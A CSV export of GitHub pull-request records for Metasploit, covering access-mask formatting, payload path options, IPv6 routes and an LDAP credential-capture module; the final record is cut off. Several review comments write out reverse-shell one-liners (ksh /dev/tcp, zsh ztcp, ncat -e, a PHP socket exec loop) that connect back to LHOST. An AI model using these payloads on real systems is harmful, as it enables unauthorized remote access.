pr_id,pr_title,pr_body,is_merged,pr_number,pr_url,pr_html_url,pr_state,additions,deletions,pr_changed_files,pr_commits_count,pr_comments_count,pr_review_comments_count,pr_labels_count,pr_assignees_count,pr_labels,pr_created_at,pr_closed_at,time_taken,time_delta,pr_review_comments,pr_commits,contributor,contributor_id,contributor_email,contributor_type,contributions,contributor_public_repos,contributor_private_repos,contributor_followings,contributor_followers
1129826638,Support for Windows Access mask to MsDtypAccessMask,"Solves Issue #17212 

This PR adds support feature to `MsDtypAccess` that translates access masks to more readable string as per the example mentioned.

## Verification

List the steps needed to make sure this thing works

- [ ] Read access masks that contain these values.
- [ ] **Verify** the thing does what it should
",True,17288,https://api.github.com/repos/rapid7/metasploit-framework/pulls/17288,https://github.com/rapid7/metasploit-framework/pull/17288,closed,15,0,1,1,1,3,3,1,"[{'name': 'library'}, {'name': 'enhancement'}, {'name': 'rn-no-release-notes'}]",2022-11-21 10:26:13+00:00,2022-11-22 14:01:58+00:00,99345.0,"1 day, 3:35:45","[{'comment_id': 1028349337, 'comment_body': ""This should be left out. It's protocol specific, so another protocol could inherit from this class and add it's own flags in here to extend the names."", 'comment_created': datetime.datetime(2022, 11, 21, 17, 36, 57, tzinfo=datetime.timezone.utc), 'commenter': 'smcintyre-r7', 'type': 'User'}, {'comment_id': 1028349989, 'comment_body': 'All of these are going to show up every time because 0 evaluates to true in Ruby.  These each need to be `... if self... != 0`', 'comment_created': datetime.datetime(2022, 11, 21, 17, 37, 38, tzinfo=datetime.timezone.utc), 'commenter': 'smcintyre-r7', 'type': 'User'}, {'comment_id': 1029108092, 'comment_body': 'Changed accordingly', 'comment_created': datetime.datetime(2022, 11, 22, 9, 53, 15, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}]","[{'commit_sha': '28157b677bd46556a0550866b47baa303322e8bd', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}]",Nishant Desai,97749978,justanda7@gmail.com,User,,20,,7,9
1119905017,Add executable path for command payloads,"Fixes #17204 and makes changes as per PR #17232. 

This PR adds a `PATH` executable as a advanced option to the cmd payloads. 

This change has been observed in metasploit v6.2.25-dev-ff508d14af
on Linux kali 5.18 (x86_64) with kernel version 5.18.0-kali5-amd64

## Verification

List the steps needed to make sure this thing works

- [ ] Start `msfconsole`
- [ ] `use exploit/windows/smb/ms08_067_netapi` or any other `exploit`
- [ ] `set payload <a payload that is modified>`
- [ ] run `show advanced`
- [ ] **Verify** the new path options available

![Screenshot_1](https://user-images.githubusercontent.com/97749978/201469812-e07546bb-de6e-4d08-8c8f-bc051ba5529f.png)
",True,17255,https://api.github.com/repos/rapid7/metasploit-framework/pulls/17255,https://github.com/rapid7/metasploit-framework/pull/17255,closed,1093,837,50,1,7,39,3,1,"[{'name': 'payload'}, {'name': 'enhancement'}, {'name': 'rn-enhancement'}]",2022-11-12 10:24:12+00:00,2022-12-08 19:26:10+00:00,2278918.0,"26 days, 9:01:58","[{'comment_id': 1024592947, 'comment_body': '```suggestion\r\n  **TelnetdPath**\r\n```', 'comment_created': datetime.datetime(2022, 11, 16, 23, 4, 47, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1024601863, 'comment_body': ""```suggestion\r\n        OptString.new('JJSPath', [true, 'The path to the JJS executable', 'jjs'])\r\n```\r\n\r\nThis applies to all other files. `Path` should be lowercase, and your missing a `the` after the `to`."", 'comment_created': datetime.datetime(2022, 11, 16, 23, 19, 40, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1024612447, 'comment_body': '```suggestion\r\n    ""#{datastore[\'KSHPath\']} -c \'#{datastore[\'KSHPath\']} >/dev/tcp/#{datastore[\'LHOST\']}/#{datastore[\'LPORT\']} 2>&1 <&1\'""\r\n```\r\n\r\nNot sure if this is needed or not but stood out as a concern.', 'comment_created': datetime.datetime(2022, 11, 16, 23, 36, 33, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1024615820, 'comment_body': 'This may also need updates for the `sh` command? Highly unlikely its ever encountered but something to consider.', 'comment_created': datetime.datetime(2022, 11, 16, 23, 43, 3, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1024618230, 'comment_body': 'May need to add in the path to bash as an option here?', 'comment_created': datetime.datetime(2022, 11, 16, 23, 48, 22, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1024618555, 'comment_body': 'Hardcoded path to `/bin/sh` here could be updated to take from a datastore option instead?', 'comment_created': datetime.datetime(2022, 11, 16, 23, 49, 6, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1024618979, 'comment_body': 'sh comments from above here again.', 'comment_created': datetime.datetime(2022, 11, 16, 23, 50, 5, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1024619703, 'comment_body': '```suggestion\r\n    ""#{datastore[\'KSHPath\']} -c \'zmodload zsh/net/tcp && ztcp #{datastore[\'LHOST\']} #{datastore[\'LPORT\']} && #{datastore[\'KSHPath\']} >&$REPLY 2>&$REPLY 0>&$REPLY\'""\r\n```', 'comment_created': datetime.datetime(2022, 11, 16, 23, 51, 41, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1024801866, 'comment_body': ""I don't think it is needed but if you think it is necessary will add the option."", 'comment_created': datetime.datetime(2022, 11, 17, 6, 34, 37, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1024802450, 'comment_body': 'This option for all modules with `/bin/sh`?', 'comment_created': datetime.datetime(2022, 11, 17, 6, 35, 39, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1024804525, 'comment_body': 'What should the description for `sh` be as `/bin/sh` is the path to the system shell ', 'comment_created': datetime.datetime(2022, 11, 17, 6, 39, 17, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1024805005, 'comment_body': 'Resolved this change', 'comment_created': datetime.datetime(2022, 11, 17, 6, 40, 3, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1024816146, 'comment_body': ""Not sure if this is necessary. The option name should be `SHELL` or `SHELL_PATH`.\r\n\r\nAlthough if it's an advanced option, then perhaps `ShellPath`.\r\n"", 'comment_created': datetime.datetime(2022, 11, 17, 6, 58, 34, tzinfo=datetime.timezone.utc), 'commenter': 'bcoles', 'type': 'User'}, {'comment_id': 1025014601, 'comment_body': '@bcoles then the value for `/bin/sh` will be?\r\n@gwillcox-r7 mentioned that hardcoded `/bin/sh` could be add as a datastore option.', 'comment_created': datetime.datetime(2022, 11, 17, 10, 30, 55, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1025064345, 'comment_body': 'The value for `/bin/sh` will be `/bin/sh`.\r\n', 'comment_created': datetime.datetime(2022, 11, 17, 11, 21, 40, tzinfo=datetime.timezone.utc), 'commenter': 'bcoles', 'type': 'User'}, {'comment_id': 1025092266, 'comment_body': 'Sorry not the value but path ?\nFor eg: SHELL_PATH for `sh` as you mentioned ', 'comment_created': datetime.datetime(2022, 11, 17, 11, 52, 6, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1025103219, 'comment_body': 'The path should remain unchanged to ensure consistency.\r\n\r\nIf the payload module currently uses `sh` then the default value should be `sh`.\r\n\r\nif the payload module currently uses `/bin/sh` then the default value should be `/bin/sh`.\r\n', 'comment_created': datetime.datetime(2022, 11, 17, 12, 3, 58, tzinfo=datetime.timezone.utc), 'commenter': 'bcoles', 'type': 'User'}, {'comment_id': 1042472393, 'comment_body': 'Not sure this is resolved? This file seems to have been removed from the change set?', 'comment_created': datetime.datetime(2022, 12, 7, 17, 9, 54, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042479230, 'comment_body': 'Confirmed resolved.', 'comment_created': datetime.datetime(2022, 12, 7, 17, 16, 29, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042479871, 'comment_body': 'Confirmed resolved.', 'comment_created': datetime.datetime(2022, 12, 7, 17, 17, 7, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042750437, 'comment_body': 'Looks like `sh` command is also used here and may need to be addressed?', 'comment_created': datetime.datetime(2022, 12, 7, 22, 39, 44, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042751147, 'comment_body': ""```suggestion\r\n        OptString.new('ShellPath', [ true, 'The path to the shell to execute', '/bin/sh' ])\r\n```\r\nNeed to update this across the board."", 'comment_created': datetime.datetime(2022, 12, 7, 22, 40, 59, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042754925, 'comment_body': ""```suggestion\r\n        OptString.new('NcatPath', [true, 'The path to the ncat executable', 'ncat']),\r\n```"", 'comment_created': datetime.datetime(2022, 12, 7, 22, 46, 48, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042755086, 'comment_body': '```suggestion\r\n    ""#{datastore[\'NcatPath\']} -e #{datastore[\'ShellPath\']} --ssl #{datastore[\'LHOST\']} #{datastore[\'LPORT\']}""\r\n```', 'comment_created': datetime.datetime(2022, 12, 7, 22, 47, 7, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042755886, 'comment_body': ""This didn't need to be indented further. Will fix this."", 'comment_created': datetime.datetime(2022, 12, 7, 22, 48, 19, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042757212, 'comment_body': ""```suggestion\r\n        OptString.new('PHPPath', [true, 'The path to the PHP executable', 'php'])\r\n```"", 'comment_created': datetime.datetime(2022, 12, 7, 22, 50, 19, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042757542, 'comment_body': '```suggestion\r\n    cmd = ""#{datastore[\'PHPPath\']} -r \'$ctxt=stream_context_create([\\""ssl\\""=>[\\""verify_peer\\""=>false,\\""verify_peer_name\\""=>false]]);while($s=@stream_socket_client(\\""ssl://#{datastore[\'LHOST\']}:#{datastore[\'LPORT\']}\\"",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode(\\""\\\\n\\"",$o);$o.=\\""\\\\n\\"";fputs($s,$o);}}\'&""\r\n```', 'comment_created': datetime.datetime(2022, 12, 7, 22, 50, 53, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042759606, 'comment_body': 'This is removing an option that other modules will likely be using?', 'comment_created': datetime.datetime(2022, 12, 7, 22, 53, 19, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042759882, 'comment_body': 'Again this is removing an option that other modules will likely be using.', 'comment_created': datetime.datetime(2022, 12, 7, 22, 53, 43, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042760588, 'comment_body': 'Removing an option that other modules might rely on.', 'comment_created': datetime.datetime(2022, 12, 7, 22, 55, 3, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042766275, 'comment_body': 'Need to undo extra indentation here.', 'comment_created': datetime.datetime(2022, 12, 7, 23, 4, 55, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042767912, 'comment_body': 'This might cause issues if code is using the previous option name `JJS_PATH` vs `JJSPath`. Specifically `modules/exploits/windows/http/manageengine_adselfservice_plus_cve_2022_28810.rb` still uses this old `JJS_PATH` datastore name, so this would break that module.', 'comment_created': datetime.datetime(2022, 12, 7, 23, 8, 11, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042798780, 'comment_body': 'This will mess up other modules like https://github.com/rapid7/metasploit-framework/blob/115946cd06faccac654e956e8ba9cf72ff328201/modules/exploits/windows/http/hp_pcm_snac_update_domain.rb#L41. This applies to all other instances of this comment as well.', 'comment_created': datetime.datetime(2022, 12, 8, 0, 9, 44, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042834927, 'comment_body': 'Resolved in https://github.com/rapid7/metasploit-framework/pull/17255/commits/0b8396778b26aba07f21dd5e568a429037cf0e35.', 'comment_created': datetime.datetime(2022, 12, 8, 1, 33, 2, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042835519, 'comment_body': 'Resolved this in https://github.com/rapid7/metasploit-framework/pull/17255/commits/050c7a6ed3e2e6168850abce0a330fbd76bb2708', 'comment_created': datetime.datetime(2022, 12, 8, 1, 34, 31, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1042847731, 'comment_body': 'Seems this was a one off mistake. Fixed in 55a98020a2152c87331f87d5b3d524cefa54c70f', 'comment_created': datetime.datetime(2022, 12, 8, 1, 55, 40, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1043405530, 'comment_body': 'So should I rollback back to the situation as it was before making changes, so as to not mess up other modules ?', 'comment_created': datetime.datetime(2022, 12, 8, 14, 18, 29, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1043649507, 'comment_body': '@JustAnda7 Sounds good 👍 I see you rolled back the changes.', 'comment_created': datetime.datetime(2022, 12, 8, 17, 49, 2, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}, {'comment_id': 1043658690, 'comment_body': 'Resolved with https://github.com/rapid7/metasploit-framework/pull/17255/commits/18d4cafa603596fc28fa59f0ff80092fc40b5e14', 'comment_created': datetime.datetime(2022, 12, 8, 17, 56, 2, tzinfo=datetime.timezone.utc), 'commenter': 'gwillcox-r7', 'type': 'User'}]","[{'commit_sha': '293a203a0300ada2be68fb3df6c0bd120e2c4f0c', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}]",Nishant Desai,97749978,justanda7@gmail.com,User,,20,,7,9
1254173468,Feature to display IPv6 Routes on Windows,"As per Issue 16693 in metasploit-framework repo, currently the meterpreter on `route` command displays only IPv4 routes only even if IPv6 routes exist. This PR aims to add the feature to display IPv6 routes that are available on using `route` command.  ",True,614,https://api.github.com/repos/rapid7/metasploit-payloads/pulls/614,https://github.com/rapid7/metasploit-payloads/pull/614,closed,117,19,2,3,5,0,2,1,"[{'name': 'enhancement'}, {'name': 'windows'}]",2023-02-25 11:03:29+00:00,2023-02-28 15:24:47+00:00,274878.0,"3 days, 4:21:18",[],"[{'commit_sha': '98726de8be4f33034020ee3c8224090940056905', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': 'bf7e5cb7c65e032cd66c2e5a0acbe61bac4c60e4', 'committer_username': 'smcintyre-r7', 'committer_name': 'Spencer McIntyre', 'committer_email': None, 'commit_date': datetime.datetime(2019, 12, 16, 17, 17, 17, tzinfo=datetime.timezone.utc)}, {'commit_sha': 'f402d7cb9ed59ece46b0b944a884bd1f103a2136', 'committer_username': 'smcintyre-r7', 'committer_name': 'Spencer McIntyre', 'committer_email': None, 'commit_date': datetime.datetime(2019, 12, 16, 17, 17, 17, tzinfo=datetime.timezone.utc)}]",Nishant Desai,97749978,justanda7@gmail.com,User,,20,,7,9
1398388827,Capture Bind request with Simple Authentication,"This PR aims to add an LDAP capture module that accepts user credentials from a simple bind request and throws an appropriate error to the user.
Currently, the module supports capturing simple LDAP authentication from clients.

## Verification

List the steps needed to make sure this thing works

- [x] Start `msfconsole`
- [x] `use auxiliary/server/capture/ldap`
- [x] set the suitable `options`.
- [x] `run`
- [ ] **Verify** the working of the module using an LDAP client.
- [ ] **Verify** that the credentials are logged to the database using `creds`
- [ ] Check the Documentation related to the module for more information

### Note Points

- This is currently tested using `ldapsearch` using a request like `ldapsearch -LLL -H ldap://ldap.example.com -D admin@example.com -W`
- This change is observed on Metasploit v6.2.",True,18125,https://api.github.com/repos/rapid7/metasploit-framework/pulls/18125,https://github.com/rapid7/metasploit-framework/pull/18125,closed,327,0,2,5,5,31,3,1,"[{'name': 'module'}, {'name': 'rn-modules'}, {'name': 'GSoC'}]",2023-06-19 14:55:18+00:00,2023-09-01 16:10:47+00:00,6398129.0,"74 days, 1:15:29","[{'comment_id': 1238709461, 'comment_body': 'This parsing looks really brittle. Surely there is a better way to parse LDAP queries than to split on some characters and hope that everything is in order and correctly formatted.', 'comment_created': datetime.datetime(2023, 6, 22, 15, 36, 35, tzinfo=datetime.timezone.utc), 'commenter': 'jvoisin', 'type': 'User'}, {'comment_id': 1238717443, 'comment_body': ':+1:', 'comment_created': datetime.datetime(2023, 6, 22, 15, 43, 17, tzinfo=datetime.timezone.utc), 'commenter': 'adfoster-r7', 'type': 'User'}, {'comment_id': 1240621205, 'comment_body': 'Any suggestions?\r\n', 'comment_created': datetime.datetime(2023, 6, 24, 6, 50, 18, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1240622703, 'comment_body': 'Assuming that all requests are made using `dn` so, a `Net::LDAP::DN` object could be created and that object could be parsed using available methods. What do you think?', 'comment_created': datetime.datetime(2023, 6, 24, 7, 3, 42, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1240707340, 'comment_body': ""Unfortunately, I don't know much about Ruby LDAP parsing :/"", 'comment_created': datetime.datetime(2023, 6, 24, 10, 58, 50, tzinfo=datetime.timezone.utc), 'commenter': 'jvoisin', 'type': 'User'}, {'comment_id': 1245476996, 'comment_body': 'Should completion of the request alway `close` the client?  If so consider putting it in an `ensure` for the method call.\r\n\r\n```suggestion\r\n    end\r\n    ensure\r\n      client.close\r\n```\r\n\r\nIf this is applied be sure you are not `double` calling `close`.', 'comment_created': datetime.datetime(2023, 6, 28, 16, 27, 12, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1245481228, 'comment_body': 'Why is this an instance variable?\r\n\r\nLooking at usage it may be viable to scope this as a private variable in `on_dispatch_request`.', 'comment_created': datetime.datetime(2023, 6, 28, 16, 30, 16, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1246953841, 'comment_body': 'I will move it in `on_dispatch_request`. We can move it out when required', 'comment_created': datetime.datetime(2023, 6, 29, 18, 9, 31, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1248093240, 'comment_body': 'Is it appropriate now?\r\n', 'comment_created': datetime.datetime(2023, 6, 30, 17, 0, 56, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1250925436, 'comment_body': 'The response here is encoded and sent to the requesting client, this should likely mimic a response message from either a common Linux LDAP server or Windows AD instead of providing a custom message that includes the `Ruby` error message.\r\n\r\nConsider matching or the result code value:\r\n``` Suggestion\r\n                         Net::LDAP::ResultStrings[Net::LDAP::ResultCodeUnwillingToPerform],\r\n```', 'comment_created': datetime.datetime(2023, 7, 3, 13, 51, 20, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1250929786, 'comment_body': 'The response here is encoded and sent to the requesting client, this should likely mimic a response message from either a common Linux LDAP server or Windows AD instead of providing a custom message.\r\n\r\nConsider matching or the result code value:\r\n``` Suggestion\r\n                Net::LDAP::ResultStrings[result_code],\r\n```', 'comment_created': datetime.datetime(2023, 7, 3, 13, 55, 7, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1250940547, 'comment_body': ""Should this be an option?  If more that one auth format is supported would you need to set this?\r\n\r\nStandard options are always registered in all `CAPS`. Also an `OptEnum` would be appropriate here to enforce specific values.\r\n\r\n```suggestion\r\n        OptEnum.new('AUTHENTICATION', [ false, 'The type of authentication used by the client.', %w[ Simple ])\r\n```"", 'comment_created': datetime.datetime(2023, 7, 3, 14, 4, 38, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1250960124, 'comment_body': 'Currently this is not needed here, either include it in the capture module itself and move into the library later if we need to.', 'comment_created': datetime.datetime(2023, 7, 3, 14, 22, 8, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1252046990, 'comment_body': 'I will remove this option for now as discussed. We can add it if required in future.', 'comment_created': datetime.datetime(2023, 7, 4, 13, 41, 10, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1252053359, 'comment_body': 'Sure I will change it', 'comment_created': datetime.datetime(2023, 7, 4, 13, 46, 56, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1253462680, 'comment_body': 'Please remove this change from this branch.', 'comment_created': datetime.datetime(2023, 7, 5, 18, 11, 29, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1273979440, 'comment_body': '```suggestion\r\n              print_good(""LDAP Login Attempt => From:#{state[client][:name]} Username:#{state[client][:user]} Password:#{state[client][:pass]}"")\r\n```', 'comment_created': datetime.datetime(2023, 7, 25, 19, 13, 32, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1274082980, 'comment_body': 'Many brute forcing tools will attempt anonymous login first using a known request string consider adding support to mock `successful` anonymous login.\r\n\r\nRaw anonymous bind will look like\r\n``` ruby\r\nANON_BIND = ""\\x30\\x0c\\x02\\x01\\x01\\x60\\x07\\x02\\x01\\x03\\x04\\x00\\x80\\x00""\r\n```\r\n\r\nAnd parse into a PDU with no user or authentication data.', 'comment_created': datetime.datetime(2023, 7, 25, 20, 25, 41, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1297451201, 'comment_body': ""When no domain is identified this will cause an exception that is swallowed during runtime:\r\n```\r\n[1] pry(#<Msf::Modules::Auxiliary__Server__Capture__Ldap::MetasploitModule>)> e\r\n=> #<ActiveRecord::RecordInvalid: Validation failed: Value can't be blank>\r\n```\r\nAddress by suppressing the `realm` keys when not found. Also `domain` is not a processed option for in `create_credential`.\r\n```suggestion\r\n    credential_data = {\r\n      origin_type: :service,\r\n      module_fullname: fullname,\r\n      username: opts[:user],\r\n      private_data: opts[:password],\r\n      private_type: :password,\r\n    }.merge(service_data)\r\n    if opts[:domain]\r\n      credential_data = {\r\n        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\r\n        realm_value: opts[:domain]\r\n      }.merge(credential_data)\r\n    end\r\n```"", 'comment_created': datetime.datetime(2023, 8, 17, 16, 16, 36, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1297456604, 'comment_body': 'Reporting anonymous login as `Success` should only be when both are emtpy.\r\n```suggestion\r\n              if user_login.name.empty? && user_login.authentication.empty?\r\n```', 'comment_created': datetime.datetime(2023, 8, 17, 16, 21, 55, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1297461582, 'comment_body': 'This is the branch of the conditional used when a plain the username was provided without `@` or `.` and should be reported as such not set to an empty string.\r\n```suggestion\r\n                  state[client][:user] = user_login.name\r\n```\r\n\r\nAnother enhancement that may be appropriate here would be to support when a `NETBIOS` formatted user is used. Example:\r\n```\r\nEXAMPLEDOMAIN\\username\r\n```', 'comment_created': datetime.datetime(2023, 8, 17, 16, 26, 25, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1299348757, 'comment_body': 'Please check if the adjustment is acceptable\r\n', 'comment_created': datetime.datetime(2023, 8, 20, 10, 4, 19, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1299348784, 'comment_body': 'Done', 'comment_created': datetime.datetime(2023, 8, 20, 10, 4, 32, tzinfo=datetime.timezone.utc), 'commenter': 'JustAnda7', 'type': 'User'}, {'comment_id': 1304981981, 'comment_body': 'A  very minor additional detail, if a `domain` was parsed out from the request it would be good to have that in the console output as well.\r\n```suggestion\r\n              result_message = ""LDAP Login Attempt => From:#{state[client][:name]} Username:#{state[client][:user]} Password:#{state[client][:pass]}""\r\n              result_message += "" Domain:#{state[client][:domain]}"" if state[client][:domain]\r\n              print_good(result_message)\r\n```\r\n\r\nor\r\n```suggestion\r\n              result_message = ""LDAP Login Attempt => From:#{state[client][:name]}""\r\n              result_message += "" Domain:#{state[client][:domain]}"" if state[client][:domain]\r\n              result_message += "" Username:#{state[client][:user]} Password:#{state[client][:pass]}""\r\n              print_good(result_message)\r\n```\r\n', 'comment_created': datetime.datetime(2023, 8, 24, 23, 56, 58, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1304982517, 'comment_body': 'What are the actual error types that can be raised here?  This rescue looks a little too general.', 'comment_created': datetime.datetime(2023, 8, 24, 23, 58, 21, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1304991701, 'comment_body': '```suggestion\r\n```\r\n\r\n`domain` is not an option accepted by `create_credential` and is ignored.', 'comment_created': datetime.datetime(2023, 8, 25, 0, 20, 16, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1305701147, 'comment_body': 'Looking further this rescue is not handling the result effectively.  This can end up sending a response that a `Net::LDAP::PDU::BindResult` is being denied, that does not match to the many possible `PDU` types this could be catching. Should this just `close` the connection, should this track the state of parsing and respond more carefully?  ', 'comment_created': datetime.datetime(2023, 8, 25, 14, 0, 43, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1305707467, 'comment_body': 'This should also be restricted to the types that can be raised in this block.', 'comment_created': datetime.datetime(2023, 8, 25, 14, 6, 19, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1305711490, 'comment_body': 'This also should be a type based on the request type.', 'comment_created': datetime.datetime(2023, 8, 25, 14, 9, 40, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1310648705, 'comment_body': ""This method needs a default case or consumers of the method need to check for `nil` and respond accordingly.  As is, if the request type was not in the hash as a supported type `nil` would be returned and `encode_ldap_response` would end up passing `to_ber_appsequence(nil)` which may result in `in '+': nil can't be coerced into Integer (TypeError)`."", 'comment_created': datetime.datetime(2023, 8, 30, 18, 10, 12, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1313244441, 'comment_body': 'For now this has been accounted for by testing `nil` on the returned result and closing the connection.  In a future update this should be adjusted to match the [RFC](https://datatracker.ietf.org/doc/html/rfc4511#section-4.1.1) and return a `Notice of Disconnection` before closing the connection:\r\n```\r\nIf the server receives an LDAPMessage from the client in which the\r\n   LDAPMessage SEQUENCE tag cannot be recognized, the messageID cannot\r\n   be parsed, the tag of the protocolOp is not recognized as a request,\r\n   or the encoding structures or lengths of data fields are found to be\r\n   incorrect, then the server SHOULD return the Notice of Disconnection\r\n   described in Section 4.4.1, with the resultCode set to protocolError,\r\n   and MUST immediately terminate the LDAP session as described in\r\n   Section 5.3.\r\n```', 'comment_created': datetime.datetime(2023, 9, 1, 16, 18, 31, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}]","[{'commit_sha': 'e3c97148e8efeff4cdac78eb3e58faee9acebedd', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': '823824163e18c56853c50a45f72360dbe2ac627e', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': '8e33badd8005395dc3c72a437a337e6d454514fb', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': '79d3cc81cb06db4acd3899f624149d6341129f81', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 